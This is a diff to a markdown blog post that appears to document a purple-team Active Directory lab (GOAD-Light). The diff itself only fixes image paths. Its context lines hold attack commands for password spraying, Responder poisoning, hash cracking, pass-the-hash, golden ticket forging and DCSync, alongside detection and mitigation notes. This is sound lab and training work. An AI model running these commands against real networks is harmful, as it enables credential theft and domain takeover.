@@ -1,16 +1,16 @@
 # Introduction
 Active Directory is almost in every organization, especially with a large amount of employees that need to be on a centralized network, database, and emails etc. Being able to break it to find vulnerabilities before attackers do is a great skill, that even if the **AD** is configured properly, there is always an open door.
-![](/images/AD.png)
+![](images/AD.png)
 # Lab Setup
 For the AD Lab i will be using [GOAD-Light](https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/#servers).
-![](/images/GOAD-Light_schema.png)
+![](images/GOAD-Light_schema.png)
 **Note**: To avoid errors during **GOAD** setup, make sure you configure everything according to the requirements as well as having all the installations and services ready. You can give any AI the context and debug if you face any issues.
 
 ## My Tuning & Tips
 **GOAD** is great by itself, but for my preference, i transformed and enhanced to a **Purple Teaming** lab, since im not only interested in Red Teaming, but also Blue Teaming. This is of course optional but if you are interested in logging all the attacks you do and seeing the defense POV, you are welcome to do so.
 
 **This is the lab after my configurations:**
-![](/images/GOAD_Light_Purple_Lab.png)
+![](images/GOAD_Light_Purple_Lab.png)
 
 ### Attacker Machine
 Since the GOAD lab does not give us an attacker machine, we have to set one up. I have a Kali machine running but its only lacking to be on the same network as the AD. 
@@ -325,25 +325,25 @@ vagrant provision GOAD-Light-DC02 --provision-with wazuh-agent
 QUICK NOTE: You may run through errors, so debug and check the code according to your lab setup, system hardware, and other requirements you might be overlooking.
 ```
 
-**After updating all VMs**![After updating all VMs](/images/Vagrant-Prov.png)
+**After updating all VMs**![After updating all VMs](images/Vagrant-Prov.png)
 
 **Setting up Wazuh through PowerShell**
-![](/images/Wazuh-ps1.png)
+![](images/Wazuh-ps1.png)
 
 **Deploying Docker for Wazuh**
-![](/images/Wazuh-DockerDeploy.png)
+![](images/Wazuh-DockerDeploy.png)
 
 **All images sould be** **up***
-![](/images/Wazuh-Docker.png)
+![](images/Wazuh-Docker.png)
 
 **Wazuh Dashboard**
-![](/images/Wazuh-Dash.png)
+![](images/Wazuh-Dash.png)
 
 **Test the SIEM**
 ``` bash
 vagrant winrm GOAD-Light-DC01 -e -c "powershell.exe -ExecutionPolicy Bypass -nop -w hidden -EncodedCommand AAAA"
 ```
-![](/images/siemtst.png)
+![](images/siemtst.png)
 Ok now we are ready.
 
 # Red Teaming
@@ -1279,7 +1279,7 @@ certipy find -u samwell.tarly -p Heartsbane -dc-ip 192.168.56.11
 So now we know there is 2 crucial vulnerabilities we can take advantage of, we will come back to them later.
 
 Connected to **DC01** & **DC02** but failed **SRV02**
-![](/images/SRV-Fail.png)
+![](images/SRV-Fail.png)
 
 Lets move to using **Bloodhound** for further enumeration.
 ``` bash
@@ -1291,28 +1291,28 @@ bloodhound-ce-python \
 -c All     
 ```
 **Results**
-![](/images/BloodHoundz.png)
+![](images/BloodHoundz.png)
 
 **Uploaded results to Bloohound**
-![](/images/BH-Upload.png)
+![](images/BH-Upload.png)
 
 **North Domain Admins**
-![](/images/Adminz.png)
+![](images/Adminz.png)
 
 **Users**
-![](/images/Users.png)
+![](images/Users.png)
 
 ## Pass Spraying
 Lets get to spraying and praying 🔫. Now this part isnt very simple, as we saw during the enumeration, there is a password lockout policy, so we have 5 tries per user before its locked for minutes to try again. We also know that the minimum password character length is 5.
 First i will try using the same usernames as passwords for each user.
 
-![](/images/Spraying.png)
+![](images/Spraying.png)
 
 ``` bash
 # No bruteforce. User 1 --> Password 1, User 2 --> Password 2.
 netexec smb 192.168.56.11 -u Users.txt -p Pass.txt --no-bruteforce --continue-on-success --log SprayRez.txt
 ```
-![](/images/SprayRez.png)
+![](images/SprayRez.png)
 We got it 😮‍💨 . I did not continue spraying cuz after i failed multiple times with default and common credentials lists. 
 
 ## LLMNR & NBT-NS Poisoning
@@ -1320,22 +1320,22 @@ We know there is two bot users making LLMNR queries every 3 and 5 minutes. With 
 ``` bash
 sudo responder -I eth0
 ```
-![](/images/NTLMv1-1.png)
+![](images/NTLMv1-1.png)
 
 After capturing the **NTLMv1**, we use **hashcat** to crack it.
 ``` bash
 hashcat -m 5500 -a 0 NTLMhashes.hashes /usr/share/wordlists/rockyou.txt.gz
 ```
-![](/images/robb-cracked.png)
+![](images/robb-cracked.png)
 
 We got the credentials for *robb.stark* and just like that, we pwned the *Winterfell* DC!
-![](/images/robbpwned.png)
+![](images/robbpwned.png)
 
 And just like that.. 
-![](/images/HackingDOG.png)
+![](images/HackingDOG.png)
 
 We got all the credentials for the *North*!
-![](/images/DUMP.png)
+![](images/DUMP.png)
 
 ## Exploiting MSSQL
 Now that we got all the credentials, lets see what we can find and use them to our advantage. 
@@ -1354,9 +1354,9 @@ After checking, *jon.snow* is the **MSSQL** administrator.
 Below is the method to exploit the **EXECUTE AS** vulnerability with a regular user.
 
 **NOTE:** You can login with RDP with **xfreerdp3** to the **SRV02** server with any of the users and take advantage of this vulnerability.
-![](/images/Imp-sa.png)
+![](images/Imp-sa.png)
 
-![](/images/sa-admin.png)
+![](images/sa-admin.png)
 
 The user *sa* has sysadmin privileges which our user lacks. Now, we can impersonate *sa*.
 ``` powershell
@@ -1366,27 +1366,27 @@ Now we have full administrative access on the MSSQL server.
 
 ## Exploiting File Upload 
 Lets first check the **IIS Website** on the IP **192.168.56.22**
-![](/images/IIS-Web.png)
+![](images/IIS-Web.png)
 
 The site has **ASP** and there is a file upload that accepts any file
-![](/images/IIS-Web-1.png)
+![](images/IIS-Web-1.png)
 
 Lets enumerate directories on the site to see what we can find
-![](/images/DirEnumIIS.png)
+![](images/DirEnumIIS.png)
 
 There is an upload directory, but we got **403**. We can see that the uploaded files go to the *upload/* folder that we were denied to access previously.
 
-![](/images/upload.png)
+![](images/upload.png)
 
 Lets try getting a **reverse shell**. I got the payload from **[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.aspx)**. After uploading the file, this is the result
-![](/images/aspxrev.png)
+![](images/aspxrev.png)
 
 But this isnt an interactive shell and we would have to combine commands. 
 I got an amazing payload from **[Darknet](https://www.darknet.org.uk/darknet-archives/#year2014:~:text=InsomniaShell%20%E2%80%93%20ASP.NET%20Reverse%20Shell%20Or%20Bind%20Shell)** that gives us an interactive shell. 
-![](/images/Interactive-shell.png)
+![](images/Interactive-shell.png)
 
 And we are in with **impersonation** enabled.
-![](/images/Whoami%20all.png)
+![](images/Whoami%20all.png)
 
 We can abuse **SeImpersonatePrivilege** using one of the [**Potato**](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) techniques or [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer).
 ``` bash
@@ -1410,20 +1410,20 @@ whoami
 ```
 
 And thats it!
-![](/images/IIS-Pwned.png)
+![](images/IIS-Pwned.png)
 
 ## Privilege Escalation (Golden Ticket)
 We pwned the *North* forest with *jeor.morment* as *Castleback* admin and all 3 admins of *Winterfell*. Now its time to move on to *sevenkingdoms*. We know that there is an **ESC1** for *sevenkingdoms* and **ESC8**. First, lets check if we can login other DCs with the same administrator hash we found
 ``` bash
 nxc smb 192.168.56.10-23 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 --local-auth
 ```
-![](/images/Escalation-Check.png)
+![](images/Escalation-Check.png)
 
 It only worked for *Castleback*. However, we authenticated locally, lets try the hash on the domain controllers without local authentication.
 ``` bash
 nxc smb 192.168.56.10-23 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
 ```
-![](/images/ESC-Pwning.png)
+![](images/ESC-Pwning.png)
 So we only have Administrator on the North domain.
 
 Lets perform a **[Golden Ticket](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)** attack using the *krbtgt* of the North domain found in our dump earlier. 
@@ -1442,7 +1442,7 @@ impacket-psexec north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdo
 ```
 
 It executed correctly but there is an issue.
-![](/images/Golden-TGTERR.png)
+![](images/Golden-TGTERR.png)
 A few things could be causing this. It could be **Windows Defender**, the .**exe** itself, a communication issue as **RemCom_communicaton** indicated. 
 
 Lets check again with a different protocol
@@ -1465,14 +1465,14 @@ ls
 ```
 
 I found nothing interesting navigating through the shares, then it clicked to me, why am i doing this? I dont need a shell directly using the **golden ticket**, i can just DCsync !
-![](/images/iq-low.jpg)
+![](images/iq-low.jpg)
 ``` bash
 impacket-secretsdump north.sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local -no-pass -k -just-dc
 ```
-![](/images/Kingslanding-DUMP.png)
+![](images/Kingslanding-DUMP.png)
 
 And just like that we have fully taken over the forest!
-![](/images/Thanos.gif)
+![](images/Thanos.gif)
 
 **Tips & Tricks**:
 - When forging the ticket, make the user Administrator or a username you know is available on that domain instead of a random user.
@@ -1529,9 +1529,9 @@ This is what typical traffic look like during an **nmap** scan using the followi
 ``` bash
 nmap -sS -sV <IP>
 ```
-![](/images/Nmap-WS2.png)
+![](images/Nmap-WS2.png)
 
-![](/images/Nmap-WS1.png)
+![](images/Nmap-WS1.png)
 
 These are the **sysmon** Event IDs
 
@@ -1563,10 +1563,10 @@ As this does not seem risky, it could be with the right passwords. Attackers can
 Remember, attackers dont break in, they **log in**.
 
 **Wireshark**
-![](/images/PassSpray-WS1.png)
+![](images/PassSpray-WS1.png)
 
 **Wazuh**
-![](/images/PassSpray-SIEM.png)
+![](images/PassSpray-SIEM.png)
 ## LLMNR/NBT-NS Poisoning and SMB Relay
 We found 2 credentials and one of them was admin using this. Using downgraded/outdated protocols is very dangerous. 
 
@@ -1581,7 +1581,7 @@ We found 2 credentials and one of them was admin using this. Using downgraded/ou
 You can also use **Responder** to detect if there is any traffic being shown as we saw earlier in our red teaming operation.
 
 This is best detected through **Wireshark**, with our **Responder** poisoning in the background this is what it looks like
-![](/images/LLMNR-WS.png)
+![](images/LLMNR-WS.png)
 ## AS-REP Roasting
 The main focus is to adjust accounts is where **kerberos pre-authentication** is disabled
 ```text
@@ -1590,10 +1590,10 @@ DONT_REQ_PREAUTH
 Require **kerberos pre-authentication** then monitor for **AS-REQ** **(4768)** activity.
 
 **Wireshark**
-![](/images/ASREP-WS.png)
+![](images/ASREP-WS.png)
 
 **Wazuh**
-![](/images/ASREP-Wazuh.png)
+![](images/ASREP-Wazuh.png)
 
 ## Kerberoasting
 We cracked multiple hashes offline with **hashcat** this way and one of them was an admin. The main issue is the password quality. 
@@ -1606,10 +1606,10 @@ We cracked multiple hashes offline with **hashcat** this way and one of them was
 Also monitor for **Kerberos service ticket requests (4769)**. 
 
 **Wireshark**
-![](/images/Kerberoasting-WS.png)
+![](images/Kerberoasting-WS.png)
 
 **Wazuh**
-![](/images/Kerberoasting-SIEM.png)
+![](images/Kerberoasting-SIEM.png)
 
 ## Passwords Stored in LDAP/AD Attributes
 The first credentials we got was stored in a user's description. This is easily avoidable, just dont write your password in clear readable places, digitally or physically (Like on your desk).
@@ -1630,7 +1630,7 @@ Very fun to exploit, hurts like hell when you are the victim. Keep in mind, not 
 - Run IIS application pools with minimal privileges.
 
 **Wireshark**
-![](/images/FileUpload-WS.png)
+![](images/FileUpload-WS.png)
 
 ## PrintSpoofer / SeImpersonatePrivilege
 File upload was the door, **SeImpersonatePrivilege** was the home owner. Without such privilege, we would not have been able to get admin privileges after we were in. How to prevent it? Simple, review and remove high privileges from unqualified users or services.
@@ -1640,13 +1640,13 @@ File upload was the door, **SeImpersonatePrivilege** was the home owner. Without
 - Monitor suspicious child processes from service processes.
 
 **Wireshark**
-![](/images/RS-WS.png)
+![](images/RS-WS.png)
 This is how it looks when an attacker downloads their payload from their local device or unencrypted http website.
 
 **Wazuh**
-![](/images/RS-Wazuh1.png)
+![](images/RS-Wazuh1.png)
 
-![](/images/RS-Wazuh2-1.png)
+![](images/RS-Wazuh2-1.png)
 
 ## MSSQL Trusted Links / Execute As
 We gained access to MSSQL with a regular user, and ended up being admin. How? These two permissions. How to prevent? Use dedicated, minimally privileged service accounts and remove unnecessary links.
@@ -1685,10 +1685,10 @@ Of course to prevent such attacks we need to:
 
 **Wireshark**
 Authenticating WMI with forged golden ticket
-![](/images/GT-WS.png)
+![](images/GT-WS.png)
 
 **Wazuh**
-![](/images/GT-Wazuh.png)
+![](images/GT-Wazuh.png)
 Also look for **4624**, **4672** and Sysmon ID **3**.
 
 # Conclusion
